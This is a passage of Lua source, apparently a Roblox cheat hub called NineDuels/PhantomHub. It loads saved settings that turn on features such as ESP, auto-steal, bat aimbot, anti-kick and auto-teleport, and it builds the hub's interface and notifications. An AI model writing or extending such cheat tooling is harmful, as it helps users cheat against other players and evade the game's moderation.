							autoTPHeight = result.autoTPHeight
						end

						if type(result.fovValue) == "number" then
							fovValue = result.fovValue
						end

						if type(result.fovIndex) == "number" then
							fovIndex = result.fovIndex
						end

						if type(result.skyTheme) == "string" then
							currentSkyTheme = result.skyTheme
						end

						if type(result.autoMoveSwing) == "boolean" then
							autoMoveSwingEnabled = result.autoMoveSwing
						end

						if type(result.autoMoveSwingInterval) == "number" then
							autoMoveSwingInterval = result.autoMoveSwingInterval
						end

						if type(result.ragdollGui) == "boolean" then
							ragdollGuiEnabled = result.ragdollGui
						end

						if type(result.mobileButtonsEnabled) == "boolean" then
							mobileButtonsEnabled = result.mobileButtonsEnabled
						end

						if type(result.sideButtonsHidden) == "boolean" then
							sideButtonsHidden = result.sideButtonsHidden
						end

						if type(result.sideButtonVisibility) == "table" then
							for k, v86 in pairs(result.sideButtonVisibility) do
								if sideButtonVisibility[k] ~= nil and type(v86) == "boolean" then
									sideButtonVisibility[k] = v86
								end
							end
						end

						_nineduelsForceCompactSideGrid = false

						if type(result.mobileButtonsSize) == "number" then
							if result.mobileButtonsSize == 52 or result.mobileButtonsSize == 50 then
								mobileButtonsSize = 45
								_nineduelsForceCompactSideGrid = true
								_savedBtnPositions = {}
								_G._phantomBtnPos = {}
							else
								mobileButtonsSize = math.clamp(result.mobileButtonsSize, 20, 80)
							end
						end

						if type(result.circleButtonsEnabled) == "boolean" then
							circleButtonsEnabled = result.circleButtonsEnabled
						end

						if type(result.introSoundEnabled) == "boolean" then
							introSoundEnabled = result.introSoundEnabled
						end

						if
							type(result.introSongChoice) == "string" and NINEDUELS_INTRO_TRACKS[result.introSongChoice]
						then
							introSongChoice = result.introSongChoice
						end

						if type(result.animEnabled) == "boolean" then
							animEnabled = result.animEnabled
						end

						if type(result.tryardAnimEnabled) == "boolean" then
							tryardAnimEnabled = result.tryardAnimEnabled
						end

						if
							type(result.selectedWalkAnimation) == "string"
							and WalkAnimationPacks[result.selectedWalkAnimation]
						then
							selectedWalkAnimation = result.selectedWalkAnimation
						end

						if type(result.walkAnimationsEnabled) == "boolean" then
							walkAnimationsEnabled = result.walkAnimationsEnabled
						end

						if type(result.saturationEnabled) == "boolean" then
							saturationEnabled = result.saturationEnabled
						end

						if type(result.espEnabled) == "boolean" then
							espEnabled = result.espEnabled
						end

						if type(result.selfEspEnabled) == "boolean" then
							selfEspEnabled = result.selfEspEnabled
						end

						if type(result.selfBoxEspEnabled) == "boolean" then
							selfBoxEspEnabled = result.selfBoxEspEnabled
						end

						if type(result.espShowName) == "boolean" then
							espShowName = result.espShowName
						end

						if type(result.espShowHealth) == "boolean" then
							espShowHealth = result.espShowHealth
						end

						if type(result.espShowDistance) == "boolean" then
							espShowDistance = result.espShowDistance
						end

						if type(result.espShowSpeed) == "boolean" then
							espShowSpeed = result.espShowSpeed
						end

						if type(result.espShowHighlight) == "boolean" then
							espShowHighlight = result.espShowHighlight
						end

						if type(result.espShowTracer) == "boolean" then
							espShowTracer = result.espShowTracer
						end

						if type(result.espUnderFeet) == "boolean" then
							espUnderFeet = result.espUnderFeet
						end

						backgroundEnabled = true
						backgroundIndex = 1

						if type(result.sideBtnBgIndex) == "number" then
							sideBtnBgIndex = result.sideBtnBgIndex
						else
							sideBtnBgIndex = 1
						end

						if type(result.stealBarBgIndex) == "number" then
							stealBarBgIndex = fn29(result.stealBarBgIndex) and result.stealBarBgIndex or 0
						else
							stealBarBgIndex = 1
						end

						if not fn29(sideBtnBgIndex) then
							sideBtnBgIndex = 0
						end

						if
							not _nineduelsForceCompactSideGrid
							and type(result.btnPositions) == "table"
							and next(result.btnPositions) ~= nil
						then
							_savedBtnPositions = result.btnPositions
						end

						if type(result.autoSwitchSpeed) == "boolean" then
							autoSwitchSpeedEnabled = result.autoSwitchSpeed
						end

						if type(result.autoSwitchLaggerCarry) == "boolean" then
							autoSwitchLaggerCarryEnabled = result.autoSwitchLaggerCarry
						end

						if type(result.guiScale) == "number" then
							_savedGuiScale = result.guiScale
						end

						applyStealBarBgImage(stealBarBgIndex)
					end)

					pcall(function()
						if animEnabled then
							task.spawn(function()
								task.wait(1)

								if startAnimToggle then
									startAnimToggle()
								end
							end)
						end

						if antiLagEnabled then
							task.spawn(function()
								task.wait(1)

								if enableAntiLag then
									enableAntiLag()
								end
							end)
						end

						if stretchRezEnabled then
							task.spawn(function()
								task.wait(0.5)

								if enableStretchRez then
									enableStretchRez()
								end
							end)
						end

						if antiVoidEnabled then
							task.spawn(function()
								task.wait(0.55)

								if _G.NineDuelsAntiVoid then
									_G.NineDuelsAntiVoid.setEnabled(true)
								end
							end)
						end

						if antiRagdollEnabled then
							task.spawn(function()
								task.wait(0.5)

								if startAntiRagdoll then
									startAntiRagdoll()
								end
							end)
						end

						if antiDieEnabled then
							task.spawn(function()
								task.wait(0.8)

								if startAntiDie then
									startAntiDie()
								end
							end)
						end

						if antiKickEnabled then
							task.spawn(function()
								task.wait(0.7)

								if startAntiKick then
									startAntiKick()
								end
							end)
						end

						if safeModeEnabled then
							task.spawn(function()
								task.wait(0.75)

								if startSafeMode then
									startSafeMode()
								end
							end)
						end

						if headlessEnabled or korbloxEnabled then
							task.spawn(function()
								task.wait(0.8)

								if applyAvatarVisuals then
									applyAvatarVisuals(LP.Character)
								end
							end)
						end

						if infJumpEnabled then
							task.spawn(function()
								task.wait(0.5)

								if setInfJumpInternal then
									setInfJumpInternal(true)
								end
							end)
						end

						if Steal.AutoStealEnabled then
							task.spawn(function()
								task.wait(1)

								if startAutoSteal then
									startAutoSteal()
								end
							end)
						end

						if batCounterEnabled then
							task.spawn(function()
								task.wait(0.5)

								if startBatCounter then
									startBatCounter()
								end
							end)
						end

						if medusaCounterEnabled then
							task.spawn(function()
								task.wait(0.85)

								if startMedusaCounter then
									startMedusaCounter()
								end
							end)
						end

						if autoTPEnabled then
							task.spawn(function()
								task.wait(0.5)

								if startAutoTP then
									startAutoTP()
								end
							end)
						end

						if currentSkyTheme and currentSkyTheme ~= "" then
							task.spawn(function()
								task.wait(1)

								if CandyApplyCustomSky then
									CandyApplyCustomSky(currentSkyTheme)
								end
							end)
						end
					end)

					do
						local function fn36()
							PlayerGui = LP:WaitForChild("PlayerGui")

							makeDraggable_cyber = function(arg, arg2)
								local v86 = arg2 or arg
								local flag18 = false
								local v87 = nil
								local position = nil
								local position2 = nil

								arg.InputBegan:Connect(function(input)
									if
										input.UserInputType == Enum.UserInputType.MouseButton1
										or input.UserInputType == Enum.UserInputType.Touch
									then
										flag18 = true
										position = input.Position
										position2 = v86.Position

										input.Changed:Connect(function()
											if input.UserInputState == Enum.UserInputState.End then
												flag18 = false
											end
										end)
									end
								end)

								arg.InputChanged:Connect(function(input)
									if
										input.UserInputType == Enum.UserInputType.MouseMovement
										or input.UserInputType == Enum.UserInputType.Touch
									then
										v87 = input
									end
								end)

								UIS.InputChanged:Connect(function(input)
									if input == v87 and flag18 then
										local n35 = input.Position - position
										v86.Position = UDim2.new(
											position2.X.Scale,
											position2.X.Offset + n35.X,
											position2.Y.Scale,
											position2.Y.Offset + n35.Y
										)
									end
								end)
							end

							C = {
								bg = Color3.fromRGB(10, 11, 12),
								bgDark = Color3.fromRGB(8, 9, 11),
								row = Color3.fromRGB(16, 17, 20),
								input = Color3.fromRGB(18, 18, 18),
								blue = Color3.fromRGB(220, 220, 220),
								blueDim = Color3.fromRGB(105, 105, 105),
								blueDark = Color3.fromRGB(42, 42, 42),
								text = Color3.fromRGB(238, 238, 238),
								textDim = Color3.fromRGB(205, 205, 215),
								textMuted = Color3.fromRGB(125, 125, 125),
								white = Color3.fromRGB(255, 255, 255),
								divider = Color3.fromRGB(30, 37, 43),
								green = Color3.fromRGB(230, 230, 230),
							}

							C.White = Color3.fromRGB(255, 255, 255)
							C.SoftWhite = Color3.fromRGB(230, 230, 230)
							C.Muted = Color3.fromRGB(150, 150, 160)
							C.Border = Color3.fromRGB(30, 37, 43)
							C.Panel2 = Color3.fromRGB(13, 14, 17)
							C.RedOff = Color3.fromRGB(120, 21, 25)

							guiCorner = function(parent, arg)
								local uiCorner = Instance.new("UICorner")
								uiCorner.CornerRadius = UDim.new(0, arg or 10)
								uiCorner.Parent = parent
								return uiCorner
							end

							guiStroke = function(parent, color, thickness)
								local instance = Instance.new("UIStroke")
								instance.Color = color or Color3.fromRGB(60, 60, 70)
								instance.Thickness = thickness or 1
								instance.Parent = parent
								return instance
							end

							kuruCard = function(parent)
								guiCorner(parent, 9)
								local v86 = guiStroke(parent, C.divider, 1)
								v86.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
								v86.Transparency = 0.4
								local uiGradient = Instance.new("UIGradient")
								uiGradient.Color =
									ColorSequence.new(Color3.fromRGB(20, 21, 25), Color3.fromRGB(13, 14, 17))
								uiGradient.Rotation = 90
								uiGradient.Transparency = NumberSequence.new(0.08, 0.08)
								uiGradient.Parent = parent
							end

							tw = function(arg, arg2, arg3)
								TweenService:Create(arg, arg3 or TweenInfo.new(0.12), arg2):Play()
							end

							GuiToggleSetters = {}
							GuiRefs = {}
							LeftPanel = nil
							Keys = {}
							DEFAULT_KEYS = {}

							pcall(function()
								if not (isfile and isfile("NineDuelsV1configLOL1/Config.json")) then
									return
								end

								local ok, result = pcall(function()
									return HS:JSONDecode(readfile("NineDuelsV1configLOL1/Config.json"))
								end)

								if ok then
									local v86 = "table"
									ok = type(result) == v86
								end

								if ok and type(result.keys) == "table" then
									for k, key in pairs(result.keys) do
										if key == false then
											Keys[k] = nil
										else
											local ok2, result2 = pcall(function()
												return Enum.KeyCode[key]
											end)

											if ok2 and result2 and result2 ~= Enum.KeyCode.Unknown then
												Keys[k] = result2
											end
										end
									end
								end
							end)

							_GuiKeys = Keys
							LP = player or Players.LocalPlayer

							setRowTab = function() end

							makeSectionHeader = function() end

							makeDivider = function() end

							makeToggleRow = function(arg, arg2, arg3, arg4)
								local function fn37(arg5)
									if arg4 then
										toggleRefs["_state_" .. arg4] = arg5
									end
								end

								if arg4 then
									toggleRefs[arg4] = fn37
								end

								return fn37, Instance.new("Frame")
							end

							makeSettingsPanel = function()
								return function() end
							end

							markBetaRiskRow = function() end

							SKY_PRESETS_LIST = SkyOrder
							applySkyPreset = CandyApplyCustomSky

							skyPresetIndex = function(name)
								for index, preset in ipairs(SkyOrder) do
									if preset == name then
										return index
									end
								end
							end

							makeButtonRow = function()
								return Instance.new("TextButton")
							end

							makeInputRow = function()
								return Instance.new("TextBox")
							end

							NotifContainer2 = nil
							NotifLayout2 = nil
							notifCount = 0

							notify = function(text, text2, arg, arg2)
								pcall(function()
									if State and State.notificationsEnabled == false then
										return
									end
									arg = arg or "info"
									arg2 = arg2 or 3.2
									notifCount = notifCount + 1
									local hub = GuiRefs.hub or PlayerGui

									if not NotifContainer2 or not NotifContainer2.Parent then
										NotifContainer2 = Instance.new("Frame", hub)
										NotifContainer2.Name = "NotificationsContainer"
										NotifContainer2.AnchorPoint = Vector2.new(1, 1)
										NotifContainer2.Position = UDim2.new(1, -18, 1, -18)
										NotifContainer2.Size = UDim2.fromOffset(228, 0)
										NotifContainer2.BackgroundTransparency = 1
										NotifContainer2.ZIndex = 200
										NotifLayout2 = Instance.new("UIListLayout", NotifContainer2)
										NotifLayout2.FillDirection = Enum.FillDirection.Vertical
										NotifLayout2.VerticalAlignment = Enum.VerticalAlignment.Bottom
										NotifLayout2.Padding = UDim.new(0, 50)
										NotifLayout2.SortOrder = Enum.SortOrder.LayoutOrder

										NotifLayout2:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
											NotifContainer2.Size =
												UDim2.fromOffset(228, NotifLayout2.AbsoluteContentSize.Y)
										end)
									end

									local tbl17 = {
										activated = { color = Color3.fromRGB(35, 190, 105), dot = "+" },
										deactivated = { color = Color3.fromRGB(235, 65, 85), dot = "-" },
										warn = { color = Color3.fromRGB(225, 155, 35), dot = "!" },
										info = { color = Color3.fromRGB(45, 120, 230), dot = "i" },
										save = { color = Color3.fromRGB(255, 255, 255), dot = "S" },
									}

									local info = tbl17[arg] or tbl17.info
									local frame = Instance.new("Frame")
									frame.Name = "Notif_" .. notifCount
									frame.Size = UDim2.fromOffset(228, 52)
									frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
									frame.BackgroundTransparency = 1
									frame.BorderSizePixel = 0
									frame.ZIndex = 201
									frame.LayoutOrder = notifCount
									frame.ClipsDescendants = true
									frame.Parent = NotifContainer2
									local uiScale = Instance.new("UIScale")
									uiScale.Scale = 0.94
									uiScale.Parent = frame
									local instance = Instance.new("Frame")
									instance.Name = "ToastShadow"
									instance.Size = UDim2.fromScale(1, 1)
									instance.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
									instance.BackgroundTransparency = 1
									instance.BorderSizePixel = 0
									instance.ZIndex = 201
									instance.Parent = frame
									guiCorner(instance, 12)
									local frame2 = Instance.new("Frame")
									frame2.Name = "ToastNotif"
									frame2.Size = UDim2.new(0, 220, 0, 44)
									frame2.Position = UDim2.new(0, 4, 0, 4)
									frame2.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
									frame2.BackgroundTransparency = 1
									frame2.BorderSizePixel = 0
									frame2.ZIndex = 202
									frame2.Parent = frame
									guiCorner(frame2, 10)
									local uiStroke = Instance.new("UIStroke")
									uiStroke.Color = Color3.fromRGB(55, 55, 55)
									uiStroke.Thickness = 1
									uiStroke.Transparency = 1
									uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
									uiStroke.Parent = frame2
									local frame3 = Instance.new("Frame")
									frame3.Size = UDim2.new(0, 3, 0, 28)
									frame3.Position = UDim2.new(0, 9, 0.5, -14)
									frame3.BackgroundColor3 = info.color
									frame3.BackgroundTransparency = 1
									frame3.BorderSizePixel = 0
									frame3.ZIndex = 203
									frame3.Parent = frame2
									guiCorner(frame3, 1)
									local textLabel = Instance.new("TextLabel")
									textLabel.Size = UDim2.new(1, -24, 0, 15)
									textLabel.Position = UDim2.new(0, 19, 0, 7)
									textLabel.BackgroundTransparency = 1
									textLabel.Text = text
									textLabel.TextSize = 11
									textLabel.Font = Enum.Font.GothamBold
									textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
									textLabel.TextXAlignment = Enum.TextXAlignment.Left
									textLabel.TextTransparency = 1
									textLabel.ZIndex = 203
									textLabel.Parent = frame2
									local instance2 = Instance.new("TextLabel")
									instance2.Size = UDim2.new(1, -24, 0, 11)
									instance2.Position = UDim2.new(0, 19, 0, 23)
									instance2.BackgroundTransparency = 1
									instance2.Text = text2
									instance2.TextSize = 10
									instance2.Font = Enum.Font.Gotham
									instance2.TextColor3 = info.color
									instance2.TextXAlignment = Enum.TextXAlignment.Left
									instance2.TextTransparency = 1
									instance2.ZIndex = 203
									instance2.Parent = frame2
									local instance3 = Instance.new("Frame")
									instance3.Size = UDim2.new(1, 0, 0, 2)
									instance3.Position = UDim2.new(0, 0, 1, -2)
									instance3.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
									instance3.BackgroundTransparency = 1
									instance3.BorderSizePixel = 0
									instance3.ZIndex = 203
									instance3.Parent = frame2
									guiCorner(instance3, 1)
									local frame4 = Instance.new("Frame")
									frame4.Size = UDim2.fromScale(1, 1)
									frame4.BackgroundColor3 = info.color
									frame4.BorderSizePixel = 0
									frame4.ZIndex = 204
									frame4.Parent = instance3
									guiCorner(frame4, 1)
									frame.Position = UDim2.fromOffset(24, 10)

									local function fn37(arg3, arg4, arg5)
										TweenService:Create(
											arg3,
											TweenInfo.new(
												arg5 or 0.38,
												Enum.EasingStyle.Quint,
												Enum.EasingDirection.Out
											),
											arg4
										):Play()
									end

									fn37(frame, { Position = UDim2.fromOffset(0, 0) }, 0.38)
									fn37(uiScale, { Scale = 1 }, 0.38)
									fn37(instance, { BackgroundTransparency = 0.85 }, 0.38)
									fn37(frame2, { BackgroundTransparency = 0 }, 0.38)
									fn37(uiStroke, { Transparency = 0.5 }, 0.38)
									fn37(frame3, { BackgroundTransparency = 0.3 }, 0.38)
									fn37(textLabel, { TextTransparency = 0 }, 0.38)
									fn37(instance2, { TextTransparency = 0 }, 0.38)
									fn37(instance3, { BackgroundTransparency = 0 }, 0.38)

									task.delay(0.1, function()
										fn37(frame4, { Size = UDim2.fromScale(0, 1) }, arg2)
									end)

									task.delay(arg2, function()
										fn37(frame, { Position = UDim2.fromOffset(22, -6) }, 0.28)
										fn37(uiScale, { Scale = 0.94 }, 0.28)
										fn37(instance, { BackgroundTransparency = 1 }, 0.28)
										fn37(frame2, { BackgroundTransparency = 1 }, 0.28)
										fn37(uiStroke, { Transparency = 1 }, 0.28)
										fn37(frame3, { BackgroundTransparency = 1 }, 0.28)
										fn37(textLabel, { TextTransparency = 1 }, 0.28)
										fn37(instance2, { TextTransparency = 1 }, 0.28)
										fn37(instance3, { BackgroundTransparency = 1 }, 0.28)

										task.delay(0.3, function()
											if frame then
												frame:Destroy()
											end
										end)
									end)
								end)
							end

							State = {
								normalSpeed = NS,
								carrySpeed = CS,
								laggerSpeed = LAGGER_SPEED,
								laggerCarrySpeed = LAGGER_CARRY_SPEED,
								espEnabled = false,
								espShowName = true,
								espShowHealth = true,
								espShowDistance = true,
								espShowSpeed = true,
								espShowHighlight = true,
								espShowTracer = false,
								espUnderFeet = false,
								notificationsEnabled = true,
								clickSoundsEnabled = true,
								hideSideButtonsEnabled = false,
								showKeybindListEnabled = false,
								autoTPDownEnabled = false,
								autoTPDownHeight = 20,
								darkModeEnabled = false,
								isStealing = false,
								stealStartTime = nil,
								lastStealTick = 0,
								batAimbotToggled = autoBatEnabled,
								batV2Toggled = _savedBatV2Toggled == true,
								dropEnabled = false,
								laggerCarryEnabled = false,
								tryardAnimEnabled = false,
								dropBrainrotEnabled = false,
								fpsBoostEnabled = antiLagEnabled,
								stretchRezEnabled = stretchRezEnabled,
								skyTheme = currentSkyTheme,
								fovValue = fovValue,
								autoLeftEnabled = autoLeftEnabled,
								autoRightEnabled = autoRightEnabled,
								autoSwitchLaggerCarryEnabled = autoSwitchLaggerCarryEnabled,
								speedToggled = carrySpeedActive,
								laggerEnabled = laggerModeEnabled,
								infJumpEnabled = infJumpEnabled,
								autoStealEnabled = true,
								antiRagdollEnabled = true,
								autoTPDownEnabled = autoTPEnabled,
							}

							startESP = nil
							stopESP = nil
							espActive = false
							espBBs = {}
							espHighlights = {}
							Gui = nil
							uiScaleObj = nil
							GrabBar = nil
							savedData = nil
							DROP_AUTO_OFF_DELAY = 2.5
							Keybinds = {}

							for k, v86 in pairs(Keys) do
								Keybinds[k] = v86
							end

							doTpDown = function()
								pcall(function()
									local character = LP.Character
									if not character then
										return
									end
									local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
									if not humanoidRootPart then
										return
									end
									local raycastParams = RaycastParams.new()
									raycastParams.FilterDescendantsInstances = { character }
									raycastParams.FilterType = Enum.RaycastFilterType.Exclude
									local hit = workspace:Raycast(
										humanoidRootPart.Position,
										Vector3.new(0, -1000, 0),
										raycastParams
									)

									if hit then
										humanoidRootPart.CFrame = CFrame.new(
											hit.Position + Vector3.new(0, humanoidRootPart.Size.Y / 2 + 0.5, 0)
										)
										humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
									end
								end)
							end

							enableStretchRez = function()
								stretchRezEnabled = true

								pcall(function()
									RunService:BindToRenderStep(
										"PhantomStretchRez",
										Enum.RenderPriority.Last.Value - 1,
										function()
											local currentCamera = workspace.CurrentCamera

											if currentCamera then
												currentCamera.CFrame = currentCamera.CFrame
													* CFrame.new(0, 0, 0, 1, 0, 0, 0, 0.8, 0, 0, 0, 1)
											end
										end
									)
								end)

								saveConfig()
							end

							disableStretchRez = function()
								stretchRezEnabled = false

								pcall(function()
									RunService:UnbindFromRenderStep("PhantomStretchRez")
								end)

								saveConfig()
							end

							playClickSound = function()
								if State and State.clickSoundsEnabled == false then
									return
								end
								local sound = Instance.new("Sound")
								sound.SoundId = "rbxassetid://5852470908"
								sound.Volume = 0.4
								sound.Parent = game:GetService("SoundService")
								sound:Play()
								game:GetService("Debris"):AddItem(sound, 1)
							end

							setupClickSounds = function(arg)
								local function fn37(descendant)
									if descendant:IsA("GuiButton") then
										descendant.MouseButton1Click:Connect(playClickSound)
									end
								end

								for _, descendant in ipairs(arg:GetDescendants()) do
									fn37(descendant)
								end

								arg.DescendantAdded:Connect(fn37)
							end

							local function fn37()
								local screenGui = Instance.new("ScreenGui")
								screenGui.Name = "PhantomHub"
								screenGui.ResetOnSpawn = false
								screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
								screenGui.Parent = PlayerGui
								GuiRefs.hub = screenGui
								setupClickSounds(screenGui)
								local instance = Instance.new("Frame")
								instance.Name = "Outer"
								instance.Size = UDim2.new(0, 420, 0, 528)
								local n35 = _phantomModeIsMobile and 0.57 or 0.5
								local n36 = _phantomModeIsMobile and -158 or -264
								instance.Position = UDim2.new(0, -440, n35, n36)
								instance.BackgroundTransparency = 1
								instance.BorderSizePixel = 0
								instance.ClipsDescendants = false
								instance.Parent = screenGui
								GuiRefs.outer = instance
								local uiScale = Instance.new("UIScale")
								local n37 = _phantomModeIsMobile and 0.4 or 0.9
								local scale = type(_savedGuiScale) == "number" and math.clamp(_savedGuiScale, 0.5, 2)
									or n37
								uiScale.Scale = scale
								uiScale.Parent = instance
								uiScaleObj = uiScale

								task.spawn(function()
									TweenService:Create(
										instance,
										TweenInfo.new(0.65, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
										{ Position = UDim2.new(0, 22, n35, n36) }
									):Play()
									TweenService:Create(
										uiScale,
										TweenInfo.new(0.65, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
										{ Scale = scale }
									):Play()
								end)

								local frame = Instance.new("Frame")
								frame.Name = "Inner"
								frame.ClipsDescendants = true
								frame.Size = UDim2.new(1, 0, 1, 0)
								frame.BackgroundColor3 = C.bg
								frame.BackgroundTransparency = 0
								frame.BorderSizePixel = 0
								frame.BorderColor3 = Color3.fromRGB(210, 210, 210)
								frame.Parent = instance
								guiCorner(frame, 16)
								guiStroke(frame, Color3.fromRGB(105, 105, 105), 1.1).Transparency = 0.18
								local v86 = guiStroke(frame, Color3.fromRGB(220, 220, 220), 2)
								v86.Transparency = 0.08
								v86.Name = "MainMonoOutline"
								GuiRefs.inner = frame
								GuiRefs.innerStroke = v86
								GuiRefs.innerGlow = v86
								local uiGradient = Instance.new("UIGradient")
								local colorSequence = ColorSequence.new
								local tbl17 = {}
								local v87 = ColorSequenceKeypoint.new(0, Color3.fromRGB(55, 55, 55))
								local v88 = ColorSequenceKeypoint.new(0.34, Color3.fromRGB(150, 150, 150))
								local v89 = ColorSequenceKeypoint.new(0.47, Color3.fromRGB(255, 255, 255))
								local v90 = ColorSequenceKeypoint.new(0.53, Color3.fromRGB(255, 255, 255))
								local v91 = ColorSequenceKeypoint.new(0.66, Color3.fromRGB(140, 140, 140))
								tbl17[1] = v87
								tbl17[2] = v88
								tbl17[3] = v89
								tbl17[4] = v90
								tbl17[5] = v91

								do
									local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(55, 55, 55)))
									table.move(values, 1, values.n, 6, tbl17)
								end

								uiGradient.Color = colorSequence(tbl17)
								uiGradient.Parent = v86

								task.spawn(function()
									while frame and frame.Parent do
										uiGradient.Rotation = 0
										local tween_ = TweenService:Create(
											uiGradient,
											TweenInfo.new(4.6, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
											{ Rotation = 360 }
										)
										tween_:Play()
										tween_.Completed:Wait()
									end
								end)

								local frame2 = Instance.new("Frame")
								frame2.Name = "BackgroundContainer"
								frame2.Size = UDim2.new(1, 0, 1, 0)
								frame2.BackgroundTransparency = 1
								frame2.ZIndex = 0
								frame2.Parent = frame
								local instance2 = Instance.new("Frame")
								instance2.Name = "BgGrad"
								instance2.Size = UDim2.new(1, 0, 1, 0)
								instance2.BackgroundColor3 = C.bgDark
								instance2.BorderSizePixel = 0
								instance2.ZIndex = 0
								instance2.Parent = frame2
								guiCorner(instance2, 24)
								local instance3 = Instance.new("UIGradient")
								local colorSequence2 = ColorSequence.new
								local tbl18 = {}
								local v92 = ColorSequenceKeypoint.new(0, Color3.fromRGB(4, 4, 4))
								local v93 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(7, 7, 7))
								local new = ColorSequenceKeypoint.new
								local color = Color3.fromRGB
								local v94 = 4
								local v95 = 4
								tbl18[1] = v92
								tbl18[2] = v93

								do
									local values = table.pack(new(1, color(v94, v95, 4)))
									table.move(values, 1, values.n, 3, tbl18)
								end

								instance3.Color = colorSequence2(tbl18)
								instance3.Rotation = 135
								instance3.Parent = instance2
								GuiRefs.bgGrad = instance2
								local imageLabel = Instance.new("ImageLabel")
								imageLabel.Name = "BackgroundImage"
								imageLabel.Size = UDim2.new(1, 0, 1, 0)
								imageLabel.Position = UDim2.new(0, 0, 0, 0)
								imageLabel.BackgroundTransparency = 1
								imageLabel.Image = ""
								imageLabel.ScaleType = Enum.ScaleType.Crop
								imageLabel.ImageTransparency = 0
								imageLabel.ZIndex = 1
								imageLabel.Visible = false
								imageLabel.Parent = frame2
								guiCorner(imageLabel, 24)
								GuiRefs.backgroundImage = imageLabel
								bgImageRef = imageLabel
								local frame3 = Instance.new("Frame")
								frame3.Name = "DimOverlay"
								frame3.Size = UDim2.new(1, 0, 1, 0)
								frame3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
								frame3.BackgroundTransparency = 0.84
								frame3.BorderSizePixel = 0
								frame3.ZIndex = 2
								frame3.Visible = false
								frame3.Parent = frame2
								guiCorner(frame3, 18)
								GuiRefs.dimOverlay = frame3
								applyBackgroundImage(backgroundIndex)
								local frame4 = Instance.new("Frame")
								frame4.Name = "HeaderFrame"
								frame4.Size = UDim2.new(1, 0, 0, 96)
								frame4.BackgroundTransparency = 1
								frame4.BorderSizePixel = 0
								frame4.Parent = frame
								frame4.ZIndex = 2
								makeDraggable_cyber(frame4, instance)
								local frame5 = Instance.new("Frame")
								frame5.Name = "ReferenceHeaderSurface"
								frame5.Position = UDim2.new(0, 10, 0, 6)
								frame5.Size = UDim2.new(1, -20, 0, 84)
								frame5.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
								frame5.BackgroundTransparency = 0.03
								frame5.BorderSizePixel = 0
								frame5.ZIndex = 2
								frame5.Parent = frame4
								guiCorner(frame5, 21)
								local v96 = 2
								local v97 = guiStroke(frame5, Color3.fromRGB(220, 220, 220), v96)
								v97.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
								v97.Enabled = false
								local v98 = guiStroke(frame5, Color3.fromRGB(75, 10, 18), 3)
								v98.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
								v98.Enabled = false

								task.spawn(function()
									while frame5 and frame5.Parent do
										for _, v99 in ipairs({ v97, v98 }) do
											if v99 and v99.Parent then
												tw(
													v99,
													{ Color = Color3.fromRGB(255, 255, 255) },
													TweenInfo.new(
														0.65,
														Enum.EasingStyle.Sine,
														Enum.EasingDirection.InOut
													)
												)
											end
										end

										task.wait(0.8)

										for _, v99 in ipairs({ v97, v98 }) do
											if v99 and v99.Parent then
												tw(
													v99,
													{ Color = Color3.fromRGB(75, 10, 18) },
													TweenInfo.new(
														0.8,
														Enum.EasingStyle.Sine,
														Enum.EasingDirection.InOut
													)
												)
											end
										end

										task.wait(0.8)
									end
								end)

								local frame6 = Instance.new("Frame", frame5)
								frame6.Name = "HeaderTopAccent"
								frame6.Position = UDim2.new(0, 26, 0, 8)
								frame6.Size = UDim2.new(1, -52, 0, 3)
								frame6.BackgroundColor3 = C.blue
								frame6.BorderSizePixel = 0
								frame6.ZIndex = 3
								guiCorner(frame6, 1)
								frame6.Visible = false
								local instance4 = Instance.new("UIGradient", frame6)
								local colorSequence3 = ColorSequence.new
								local tbl19 = {}
								local v99 = ColorSequenceKeypoint.new(0, Color3.fromRGB(55, 55, 55))
								local v100 = ColorSequenceKeypoint.new(0.18, Color3.fromRGB(100, 100, 100))
								local v101 = ColorSequenceKeypoint.new(0.48, Color3.fromRGB(220, 220, 220))
								local v102 = ColorSequenceKeypoint.new(0.58, Color3.fromRGB(230, 230, 230))
								local v103 = ColorSequenceKeypoint.new(0.78, Color3.fromRGB(100, 100, 100))
								tbl19[1] = v99
								tbl19[2] = v100
								tbl19[3] = v101
								tbl19[4] = v102
								tbl19[5] = v103

								do
									local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(55, 55, 55)))
									table.move(values, 1, values.n, 6, tbl19)
								end

								instance4.Color = colorSequence3(tbl19)
								instance4.Offset = Vector2.new(0, 0)
								local imageLabel2 = Instance.new("ImageLabel")
								imageLabel2.Name = "OriginalBanner"
								imageLabel2.Position = UDim2.new(0, 10, 0, 7)
								imageLabel2.Size = UDim2.new(0, 218, 0, 48)
								imageLabel2.BackgroundTransparency = 1
								imageLabel2.Image = ""
								imageLabel2.ScaleType = Enum.ScaleType.Fit
								imageLabel2.ZIndex = 3
								imageLabel2.Parent = frame4
								imageLabel2.Visible = false
								GuiRefs.originalBanner = imageLabel2
								local instance5 = Instance.new("Frame")
								instance5.Name = "BrandBadge"
								instance5.Size = UDim2.new(0, 34, 0, 30)
								instance5.Position = UDim2.new(0, 14, 0, 12)
								instance5.BackgroundColor3 = C.blue
								instance5.BackgroundTransparency = 0.18
								instance5.BorderSizePixel = 0
								instance5.ZIndex = 4
								instance5.Parent = frame4
								guiCorner(instance5, 10)
								guiStroke(instance5, Color3.fromRGB(255, 255, 255), 1).Transparency = 0.7
								local textLabel = Instance.new("TextLabel", instance5)
								textLabel.Size = UDim2.new(1, 0, 1, 0)
								textLabel.BackgroundTransparency = 1
								textLabel.Text = "ND"
								textLabel.TextColor3 = C.white
								textLabel.TextSize = 12
